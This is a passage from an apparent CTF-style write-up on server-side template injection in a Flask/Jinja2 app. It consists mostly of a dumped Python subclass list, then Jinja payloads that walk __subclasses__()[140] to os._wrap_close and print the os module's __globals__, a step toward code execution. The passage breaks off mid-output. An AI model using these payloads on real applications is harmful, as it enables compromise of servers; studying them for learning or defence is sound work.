\u0026#39;werkzeug.wrappers.response.ResponseStream\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.test._TestCookieHeaders\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.test._TestCookieResponse\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.test.EnvironBuilder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.test.Client\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.local.Local\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.local.LocalManager\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.local._ProxyLookup\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.globals._FakeStack\u0026#39;\u0026gt; \u0026lt;class \u0026#39;decimal.Decimal\u0026#39;\u0026gt; \u0026lt;class \u0026#39;decimal.Context\u0026#39;\u0026gt; \u0026lt;class \u0026#39;decimal.SignalDictMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;decimal.ContextManager\u0026#39;\u0026gt; \u0026lt;class \u0026#39;platform._Processor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;uuid.UUID\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.json.provider.JSONProvider\u0026#39;\u0026gt; \u0026lt;class \u0026#39;gettext.NullTranslations\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click._compat._FixupStream\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click._compat._AtomicFile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.utils.LazyFile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.utils.KeepOpenFile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.utils.PacifyFlushWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.types.ParamType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.parser.Option\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.parser.Argument\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.parser.ParsingState\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.parser.OptionParser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.formatting.HelpFormatter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.core.Context\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.core.BaseCommand\u0026#39;\u0026gt; \u0026lt;class \u0026#39;click.core.Parameter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.converters.BaseConverter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;difflib.SequenceMatcher\u0026#39;\u0026gt; \u0026lt;class \u0026#39;difflib.Differ\u0026#39;\u0026gt; \u0026lt;class \u0026#39;difflib.HtmlDiff\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pprint._safe_key\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pprint.PrettyPrinter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.rules.RulePart\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.rules.RuleFactory\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.rules.RuleTemplate\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.matcher.State\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.matcher.StateMachineMatcher\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.map.Map\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.routing.map.MapAdapter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.signals.Namespace\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.signals._FakeSignal\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.cli.ScriptInfo\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.config.ConfigAttribute\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.ctx._AppCtxGlobals\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.ctx.AppContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.ctx.RequestContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pathlib._Flavour\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pathlib._Selector\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pathlib._TerminatingSelector\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pathlib.PurePath\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.scaffold.Scaffold\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itsdangerous.signer.SigningAlgorithm\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itsdangerous.signer.Signer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itsdangerous.serializer.Serializer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itsdangerous._json._CompactJSON\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.json.tag.JSONTag\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.json.tag.TaggedJSONSerializer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.sessions.SessionInterface\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask.blueprints.BlueprintSetupState\u0026#39;\u0026gt; \u0026lt;class \u0026#39;subprocess.CompletedProcess\u0026#39;\u0026gt; \u0026lt;class \u0026#39;subprocess.Popen\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.compat.nullcontext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_csv.Dialect\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_csv.reader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_csv.writer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;csv.Dialect\u0026#39;\u0026gt; \u0026lt;class \u0026#39;csv.DictReader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;csv.DictWriter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;csv.Sniffer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zipfile.ZipInfo\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zipfile.LZMACompressor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zipfile.LZMADecompressor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zipfile._SharedFile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zipfile._Tellable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zipfile.ZipFile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zipfile.Path\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.resources.abc.ResourceReader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.resources._adapters.SpecLoaderAdapter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.resources._adapters.TraversableResourcesLoader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.resources._adapters.CompatibilityFiles\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.abc.Finder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.abc.MetaPathFinder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.abc.PathEntryFinder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.Sectioned\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.DeprecatedTuple\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.Deprecated\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.FileHash\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.Distribution\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.DistributionFinder.Context\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.FastPath\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.Lookup\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib.metadata.Prepared\u0026#39;\u0026gt; \u0026lt;class \u0026#39;configparser.Interpolation\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._collections.ImmutableContainer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.cimmutabledict.immutabledict\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._collections.Properties\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._collections.IdentitySet\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._collections.WeakSequence\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._collections.UniqueAppender\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._collections.ScopedRegistry\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._preloaded._ModuleRegistry\u0026#39;\u0026gt; \u0026lt;class \u0026#39;greenlet.greenlet\u0026#39;\u0026gt; \u0026lt;class \u0026#39;concurrent.futures._base._Waiter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;concurrent.futures._base._AcquireFutures\u0026#39;\u0026gt; \u0026lt;class \u0026#39;concurrent.futures._base.Future\u0026#39;\u0026gt; \u0026lt;class \u0026#39;concurrent.futures._base.Executor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.events.Handle\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.events.AbstractServer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.events.AbstractEventLoop\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.events.AbstractEventLoopPolicy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_asyncio.FutureIter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;TaskStepMethWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_RunningLoopHolder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_asyncio.Future\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.futures.Future\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.protocols.BaseProtocol\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.transports.BaseTransport\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.mixins._LoopBoundMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.locks._ContextManagerMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.trsock.TransportSocket\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.runners.Runner\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.streams.StreamWriter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.streams.StreamReader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.subprocess.Process\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.taskgroups.TaskGroup\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.timeouts.Timeout\u0026#39;\u0026gt; \u0026lt;class \u0026#39;asyncio.unix_events.AbstractChildWatcher\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.exc.HasDescriptionCode\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.exc.DontWrapMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.safe_reraise\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.PluginLoader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.portable_instancemethod\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.memoized_property\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.HasMemoized.memoized_attribute\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.HasMemoized\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.MemoizedSlots\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.hybridproperty\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.hybridmethod\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.langhelpers.symbol\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._concurrency_py3k.AsyncAdaptedLock\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util._compat_py3k._AsyncGeneratorContextManager\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.roles.SQLRole\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.roles.UsesInspection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.roles.AllowsLambdaRole\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.visitors.Traversible\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.visitors.InternalTraversal\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.visitors.ExternalTraversal\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.operators.Operators\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.operators.custom_op\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.traversals.HasCacheKey\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.traversals.HasCopyInternals\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.base.Immutable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.base.DialectKWArgs\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.base.CompileState\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.base.Options\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.base.SchemaEventTarget\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.base.ColumnCollection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions.RoleImpl\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions._Deannotate\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions._StringOnly\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions._ReturnsStringKey\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions._ColumnCoercions\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions._NoTextCoercion\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions._CoerceLiterals\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.coercions._SelectIsNotFrom\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.type_api.ExternalType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.type_api.Emulated\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.type_api.NativeForEmulated\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.annotation.SupportsAnnotations\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.annotation.Annotated\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.elements.WrapsColumnExpression\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.event.registry._EventKey\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.event.attr._empty_collection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.event.base._UnpickleDispatch\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.event.base._Dispatch\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.event.base.Events\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.event.base._JoinedDispatcher\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.event.base.dispatcher\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.cprocessors.UnicodeResultProcessor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.DecimalResultProcessor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.sqltypes._LookupExpressionAdapter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.sqltypes.Concatenable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.sqltypes.Indexable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.selectable.HasPrefixes\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.selectable.HasSuffixes\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.selectable.HasHints\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.selectable.NoInit\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.selectable.DeprecatedSelectBaseGenerations\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.selectable.DeprecatedSelectGenerations\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.selectable._SelectFromElements\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.schema.IdentityOptions\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.schema.ColumnCollectionMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.util._repr_base\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.util.ColumnAdapter._IncludeExcludeMapping\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.dml.DMLWhereBase\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.functions._FunctionGenerator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.compiler.Compiled\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.compiler.TypeCompiler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.compiler.IdentifierPreparer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.lambdas.AnalyzedCode\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.lambdas.NonAnalyzedFunction\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.lambdas.AnalyzedFunction\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.sql.naming.ConventionDict\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.interfaces.Dialect\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.interfaces.CreateEnginePlugin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.interfaces.ExecutionContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.interfaces.Connectable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.interfaces.ExceptionContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.interfaces.AdaptedConnection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.util.TransactionalContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.log.Identified\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.log.InstanceLogger\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.log.echo_property\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.base.Engine._trans_ctx\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.base.OptionEngineMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.pool.base._ConnDialect\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.pool.base._ConnectionRecord\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.pool.base._ConnectionFairy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.queue.Queue\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.util.queue.AsyncAdaptedQueue\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.pool.dbapi_proxy._DBProxy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.cresultproxy.BaseRow\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.util.tuplegetter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.result.ResultMetaData\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.result._WithKeys\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.result.FrozenResult\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.cursor.ResultFetchStrategy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.cursor.BaseCursorResult\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.reflection.Inspector\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.engine.default._RendersLiteral\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.base.InspectionAttr\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.base._MappedAttribute\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.collections._PlainColumnGetter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.collections._SerializableColumnGetter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.collections._SerializableAttrGetter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.collections.collection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.collections.CollectionAdapter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.interfaces.LoaderStrategy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.attributes.AttributeEvent\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.attributes.AttributeImpl\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.state.AttributeState\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.state.PendingCollection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.instrumentation._SerializeManager\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.instrumentation.InstrumentationFactory\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.util.AliasedClass\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.util._WrapUserEntity\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.strategy_options.loader_option\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.loading.PostLoad\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.relationships.JoinCondition\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.relationships._ColInAnnotations\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.context.QueryContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.context._QueryEntity\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.clsregistry._MultipleClassMarker\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.clsregistry._ModuleMarker\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.clsregistry._ModNS\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.clsregistry._GetColumns\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.clsregistry._GetTable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.clsregistry._class_resolver\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.decl_base._MapperConfig\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.decl_api.registry\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.identity.IdentityMap\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.query.BulkUD\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.evaluator.EvaluatorCompiler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.persistence.ORMDMLState\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.unitofwork.UOWTransaction\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.unitofwork.IterateMappersMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.unitofwork.PostSortRec\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.session._SessionClassMethods\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.scoping.ScopedSessionMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.events._InstrumentationEventsHold\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.events._EventsHold.HoldEvents\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.strategies.LoadDeferredColumns\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.strategies.LoadLazyAttribute\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.strategies.SubqueryLoader._SubqCollections\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.dynamic.DynamicCollectionAdapter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.dynamic.AppenderMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.dynamic.CollectionHistory\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.orm.dependency.DependencyProcessor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask_sqlalchemy.pagination.Pagination\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask_sqlalchemy.model._QueryProperty\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask_sqlalchemy.model.Model\u0026#39;\u0026gt; \u0026lt;class \u0026#39;flask_sqlalchemy.extension.SQLAlchemy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.dialects.sqlite.json._FormatTypeMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.dialects.sqlite.base._DateTimeMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.dialects.sqlite.aiosqlite.AsyncAdapt_aiosqlite_cursor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlalchemy.dialects.sqlite.aiosqlite.AsyncAdapt_aiosqlite_dbapi\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlite3.Row\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlite3.Cursor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlite3.Connection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlite3.Statement\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlite3.PrepareProtocol\u0026#39;\u0026gt; \u0026lt;class \u0026#39;sqlite3.Blob\u0026#39;\u0026gt;] ::: And we need to find \u0026lt;class 'os._wrap_close'\u0026gt; which is in line 141 that is in 140-th of list. Payload: {{[].__class__.__base__.__subclasses__()[140].__init__}} → Output: \u0026lt;function _wrap_close.__init__ at 0x7fceecae2a20\u0026gt; Payload: {{[].__class__.__base__.__subclasses__()[140].__init__.__globals__}} → :::spoiler Output: Hello {\u0026#39;__name__\u0026#39;: \u0026#39;os\u0026#39;, \u0026#39;__doc__\u0026#39;: \u0026#34;OS routines for NT or Posix depending on what system we\u0026#39;re on.\\n\\nThis exports:\\n - all functions from posix or nt, e.g. unlink, stat, etc.\\n - os.path is either posixpath or ntpath\\n - os.name is either \u0026#39;posix\u0026#39; or \u0026#39;nt\u0026#39;\\n - os.curdir is a string representing the current directory (always \u0026#39;.\u0026#39;)\\n - os.pardir is a string representing the parent directory (always \u0026#39;..\u0026#39;)\\n - os.sep is the (or a most common) pathname separator (\u0026#39;/\u0026#39; or \u0026#39;\\\\\\\\\u0026#39;)\\n - os.extsep is the extension separator (always \u0026#39;.\u0026#39;)\\n - os.altsep is the alternate pathname separator (None or \u0026#39;/\u0026#39;)\\n - os.pathsep is the component separator used in $PATH etc\\n - os.linesep is the line separator in text files (\u0026#39;\\\\r\u0026#39; or \u0026#39;\\\\n\u0026#39; or \u0026#39;\\\\r\\\\n\u0026#39;)\\n - os.defpath is the default search path for executables\\n - os.devnull is the file path of the null device (\u0026#39;/dev/null\u0026#39;, etc.)\\n\\nPrograms that import and use \u0026#39;os\u0026#39; stand a better chance of being\\nportable between different platforms. Of course, they must then\\nonly use functions that are defined by all platforms (e.g., unlink\\nand opendir), and leave all pathname manipulation to os.path\\n(e.g., split and join).\\n\u0026#34;, \u0026#39;__package__\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;__loader__\u0026#39;: \u0026lt;class \u0026#39;_frozen_importlib.FrozenImporter\u0026#39;\u0026gt;, \u0026#39;__spec__\u0026#39;: ModuleSpec(name=\u0026#39;os\u0026#39;, loader=\u0026lt;class \u0026#39;_frozen_importlib.FrozenImporter\u0026#39;\u0026gt;, origin=\u0026#39;frozen\u0026#39;), \u0026#39;__file__\u0026#39;: \u0026#39;/usr/local/lib/python3.11/os.py\u0026#39;, 